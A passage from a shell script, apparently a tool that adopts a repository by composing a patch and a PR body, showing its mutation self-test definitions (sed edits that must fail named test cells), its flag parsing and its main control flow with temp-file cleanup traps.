  mutant "live-ci-line-without-area-c" '/# MUT-CIALWAYS$/s/\[ "\$A_C" -eq 1 \]/[ -n "$A_R" ]/' cell_a13
  mutant "owners-checks-only-the-github-dir" '/# MUT-OWNERSDIR$/s, CODEOWNERS docs/CODEOWNERS; do,; do,' cell_a13
  mutant "team-defaults-to-solo" "/# MUT-TEAMDEFAULT\$/s/.*/    '') TEAM=solo ;;/" cell_a17
}
selftest_mutants_1011() {  # the standing mutants of the lint and test command detector (SWAS-1011, design 7.3); each is a one-line sed of its tagged line and must red the cells it names
  mutant "package-json-edited-in-the-work-copy" '/# MUT-PKGEDIT$/s/   # MUT-PKGEDIT$/; printf "{}\\n" > package.json   # MUT-PKGEDIT/' cell_a20
  mutant "detector-never-runs" '/# MUT-NODETECT$/s/lint_detect/:/' cell_a19 cell_a26
  mutant "rule-b-fires-whatever-the-operands" '/# MUT-OPERANDBLIND$/s/\[ "\$_lo" -eq 0 \] && //' cell_a21
  mutant "test-runner-condition-dropped" '/# MUT-RUNNERALWAYS$/s/! lint_runner_ok "\$_rm"/false/' cell_a21
  mutant "rule-a-never-fires" '/# MUT-NOGLOBRULE$/s/-n "\$_lw"/-n ""/' cell_a22 cell_a24
  mutant "folder-list-skips-the-adopter-file-test" '/# MUT-ALLDIRS$/s/!(\$0 in m)/0/' cell_a23
  mutant "folder-list-takes-any-manifest-folder" '/# MUT-KITDIR$/s/-d "\$ROOT\/\$_lfd"/-n "$_lfd"/' cell_a23
  mutant "findings-not-capped" '/# MUT-CAP$/s/-le 20/-le 99999/' cell_a22
  mutant "script-key-printed-raw" '/# MUT-RAWKEY$/s/.*/  :   # MUT-RAWKEY/' cell_a24
  mutant "manifest-gate-dropped" '/# MUT-NOMANIFESTGATE$/s/.*/  :   # MUT-NOMANIFESTGATE/' cell_a21
  mutant "guard-only-writes-the-summary" '/# MUT-GUARDONLYNOTE$/s/if \[ "\$GUARD_ONLY" -eq 0 \]; then add_summary; fi/add_summary/' cell_a25
}
selftest_mutants_1010() {  # the standing mutants of the PR body (SWAS-1010 PR 4, errata Q2, R2-N6 and design 8, C9); each is a sed of its tagged line and must red the cells it names
  mutant "M-AD1 body-written-world-readable" '/# FAULT-BODYWRITE$/s/umask 077/umask 022/' cell_ad1
  mutant "M-NEXTPR no-next-step-for-the-body" '/# MUT-NEXTPR$/s/.*//' cell_ad1
  mutant "M-AD2 body-overwrites-an-existing-file" '/# MUT-PRCHECK$/s/.*/  :/
/# FAULT-BODYWRITE$/s/set -C; //' cell_ad2
  mutant "M-AD4 symlinked-body-counts-as-absent" '/# MUT-PRCHECK$/s/ && \[ ! -L "\$PRB" \]//' cell_ad4
  mutant "M-AD5 body-written-before-the-self-check" '/# MUT-BODYLATE$/s/.*/  :/
/# MUT-NOCHECK$/s/^verify_applied/write_body; verify_applied/' cell_ad3
  mutant "M-AD5b body-failure-keeps-the-patch" '/# MUT-KEEPPATCH$/s/.*/  :/' cell_ad5
  mutant "M-AD6 signal-keeps-the-files" '/# MUT-PARTTRAP$/s/rm -f "\$OUTREAL" "\$PRB"; //' cell_ad6
  mutant "M-B3 body-calls-own-ci-stamped" '/## If you drop a step from your ci.yml/s/your ci.yml/the stamped ci.yml/' cell_b3
  mutant "M-B1 body-omits-solo-go-bound" '/# MUT-SOLOLINE$/s/.*/  :/' cell_b1
  mutant "M-B2 body-lists-every-workflow-whatever-the-tree-holds" '/# MUT-HOLDS$/s/.*/has_wf() { return 0; }/' cell_b2
}

# --- main ---
if [ "${1:-}" = "--selftest" ]; then selftest; exit $?; fi

TARGET=""; OUT=""; REPLACE=0
while [ $# -gt 0 ]; do
  case "$1" in
    --out) [ $# -ge 2 ] || die2 "--out requires a value"; OUT=$2; shift 2 ;;
    --replace-guard) REPLACE=1; shift ;;
    --guard-only) GUARD_ONLY=1; shift ;;
    --existing) EXISTING=1; shift ;;
    --db) DB=1; shift ;;
    --team) [ $# -ge 2 ] || die2 "--team requires a value"; TEAM=$2; shift 2 ;;
    --backlog) [ $# -ge 2 ] || die2 "--backlog requires a value"; BACKLOG=$2; shift 2 ;;
    --ci) [ $# -ge 2 ] || die2 "--ci requires a value"; CI=$2; shift 2 ;;
    --stack) [ $# -ge 2 ] || die2 "--stack requires a value"; STACK=$2; shift 2 ;;
    --owner) [ $# -ge 2 ] || die2 "--owner requires a value"; OWNER=$2; shift 2 ;;
    --name) [ $# -ge 2 ] || die2 "--name requires a value"; NAME=$2; shift 2 ;;
    --tracker-url) [ $# -ge 2 ] || die2 "--tracker-url requires a value"; TURL=$2; shift 2 ;;
    --tracker-project) [ $# -ge 2 ] || die2 "--tracker-project requires a value"; TPROJ=$2; shift 2 ;;
    -h|--help) usage ;;
    -*) die2 "unknown flag '$(safe "$1")'" ;;
    *) [ -z "$TARGET" ] || die2 "one <target-repo> only"; TARGET=$1; shift ;;
  esac
done
{ [ -n "$TARGET" ] && [ -n "$OUT" ]; } || usage
validate_flags

need_tools
read_wiring
load_lib
check_target
pick_stack_ci_name
set_paths
check_paths
check_out
tmp_parent
T=$(mktemp -d "$TPARENT/adopt.XXXXXX") || die2 "no temp dir"
trap 'rm -rf "$T"' EXIT
trap 'rm -rf "$T"; exit 129' HUP
trap 'rm -rf "$T"; exit 130' INT
trap 'rm -rf "$T"; exit 143' TERM
check_tmp
snapshot_base
SJ="$T/base/.claude/settings.json"; GI="$T/base/.gitignore"
check_settings
plan_guards
plan_settings
GI_MISSING=$(gi_missing)
load_region
plan_entry
: > "$T/rec"
lint_detect   # MUT-NODETECT
if [ "$GUARD_ONLY" -eq 0 ]; then plan_areas; fi
if [ "$SET_STATE" = none ] && [ -z "$GUARD_WRITE" ] && [ -z "$GI_MISSING" ] && [ -z "$EC_WRITE" ] && [ -z "$AREAS_NEW" ]; then
  as_is_lock   # MUT-ASISLOCK
  already; already_notes; exit 0
fi
rec_guard
compose
if [ ! -s "$T/patch" ]; then
  as_is_lock   # MUT-ASISLOCK
  already; already_notes; exit 0
fi
compose_body
if [ "$GUARD_ONLY" -eq 0 ]; then add_summary; fi   # MUT-GUARDONLYNOTE
verify_applied   # MUT-NOCHECK
if [ "$GUARD_ONLY" -eq 0 ]; then check_summary; fi
write_out
trap 'rm -rf "$T"; rm -f "$OUTREAL" "$PRB"; exit 129' HUP   # between the patch and the body, a signal leaves neither file behind
trap 'rm -rf "$T"; rm -f "$OUTREAL" "$PRB"; exit 130' INT
trap 'rm -rf "$T"; rm -f "$OUTREAL" "$PRB"; exit 143' TERM   # MUT-PARTTRAP
write_body   # MUT-BODYLATE
trap 'rm -rf "$T"; exit 129' HUP
trap 'rm -rf "$T"; exit 130' INT
trap 'rm -rf "$T"; exit 143' TERM
report
